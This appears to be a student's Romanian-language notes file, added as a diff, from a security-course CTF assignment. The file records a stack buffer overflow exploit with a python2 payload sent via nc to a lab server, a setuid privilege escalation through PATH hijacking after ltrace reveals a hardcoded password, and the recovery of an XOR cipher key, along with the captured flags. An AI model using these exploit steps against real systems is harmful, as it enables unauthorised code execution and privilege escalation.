@@ -1,0 +1,137 @@
+================================ Comenzi Terminal ===================================
+
+==================================== Ex 03 ==========================================
+
+Use objdump -d -M intel buffovf to list all the addresses from the binary. Look for the address of the wanted function.
+
+objdump -d -M intel casino
+
+Adresa functei win: 08|04|86|1b => "\x1b\x86\x04\x08"
+
+Adresa functiei exit: 08|04|84|90 => "\x90\x84\x04\x08"
+
+Adresa functiei frnr66: 08|04|86|fe => "\xfe\x86\x04\x08"
+
+e8 e3 fe ff ff => "e8e3feffff"
+
+
+pattc 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+
+gdb-peda$ r <<< 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+
+
+EIP: pa0x41644141 ('AAdA')
+
+gdb-peda$ patto 'AAdA'
+AAdA found at offset: 64
+
+gdb-peda$ run "" < <(python2 -c 'print (64 * "A" + "\x1b\x86\x04\x08" + "\x90\x84\x04\x08" + "\x1b\x37\x33\x11")')
+Starting program: /home/vladutmargineanu/Desktop/TSSC_labs/Tema01_TSSC/nicolae.margineanu/task3/casino "" < <(python2 -c 'print (64 * "A" + "\x1b\x86\x04\x08" + "\x90\x84\x04\x08" + "\x1b\x37\x33\x11")')
+Welcome to the Saint Tropez Virtual Casino!
+Please enter your bank account:
+You did it! BUT there is no flag available locally!
+Try it on the remote server ;) 
+Otherwise, you corrupted the stack too much and it won't give you the results :( 
+[Inferior 1 (process 6434) exited with code 01]
+Warning: not running
+
+
+python2 -c 'print (64 * "A" + "\x1b\x86\x04\x08" + "\x90\x84\x04\x08" + "\x1b\x37\x33\x11")' | nc isc2021.root.sx 10027
+Welcome to the Saint Tropez Virtual Casino!
+Please enter your bank account:
+https://www.youtube.com/watch?v=pOyK9qQpdyQ SpeishFlag{uUjwSsP9sPwvtoQMQ0r8a4LLoLFz98H1}
+
+==================================== Ex 02 ==========================================
+
+ssh -i id_rsa fhunt@isc2021.root.sx
+
+parlit@fhunt:~$ find / -name hints.txt
+
+parlit@fhunt:~$ cd /usr/share/vim/talent/
+
+parlit@fhunt:/usr/share/vim/talent$ cat hints.txt 
+Here's more hints:
+
+  - Gandalf giving you problems, again? try the magic words `ltrace`.
+  - What if I told you... that you can escalate privileges on SETUID binaries
+    using just one simple trick!
+
+parlit@fhunt:/usr/share/vim/talent$ objdump -d -M intel indestructibil 
+
+parlit@fhunt:/usr/share/vim/talent$ ltrace ./indestructibil 
+
+__libc_start_main(0x400746, 1, 0x7ffe81aafd98, 0x400820 <unfinished ...>
+puts("You shall not pass!\n"You shall not pass!
+
+)                                 = 21
++++ exited (status 1) +++
+
+
+parlit@fhunt:/usr/share/vim/talent$ ltrace ./indestructibil "mama"
+__libc_start_main(0x400746, 2, 0x7fff01c772e8, 0x400820 <unfinished ...>
+strcmp("mama", "ba883b3e4e746053e80072d4601199f9"...)         = 11
+puts("You shall not pass!\n"You shall not pass!
+
+)                                 = 21
+
+
+parlit@fhunt:/usr/share/vim/talent$ ./indestructibil ba883b3e4e746053e80072d4601199f9
+/usr/local/include/valoare/flag2020: ASCII text
+
+
+parlit@fhunt:~$ echo $PATH
+/home/parlit/bin:/home/parlit/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+parlit@fhunt:~$ mkdir bin       
+parlit@fhunt:~$ cd bin/
+parlit@fhunt:~/bin$ cp /bin/cat file
+parlit@fhunt:~/bin$ ls
+file
+
+
+parlit@fhunt:/usr/share/vim/talent$ ./indestructibil ba883b3e4e746053e80072d4601199f9
+SpeishFlag{VZfczmD7PW6Pz3V2Px8j4VmtLtZ0Jafe}
+
+
+==================================== Ex 01 ==========================================
+
+// Decodez flrn.bin cu o cheie gresita si obtin un garbage decriptat in care se inteleg cateva cuvinte
+vladutmargineanu@vladutmargineanu15:~/Desktop/TSSC/Tema01_TSSC/nicolae.margineanu/task1$ python cryptolocker.py flrns.txt.bin out01.txt "abcdef"
+
+// Extrag ultima linie din garbage de la offset-ul obtinut cu primul cuvant care se intelege
+vladutmargineanu@vladutmargineanu15:~/Desktop/TSSC/Tema01_TSSC/nicolae.margineanu/task1$ python extract_offset.py out04.txt
+
+// Extrag linia din flrn.bin de la offset ul respectiv cu linia din garbage si fac xor cu linia originala decriptata
+vladutmargineanu@vladutmargineanu15:~/Desktop/TSSC/Tema01_TSSC/nicolae.margineanu/task1$ python extract_line.py flrns.txt.bin line_text.txt "0x358"
+
+// Fac xor pe flrn.bin cu cheia obtinuta mai sus
+vladutmargineanu@vladutmargineanu15:~/Desktop/TSSC/Tema01_TSSC/nicolae.margineanu/task1$ python xor.py line_text.txt flrns.txt.bin test.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
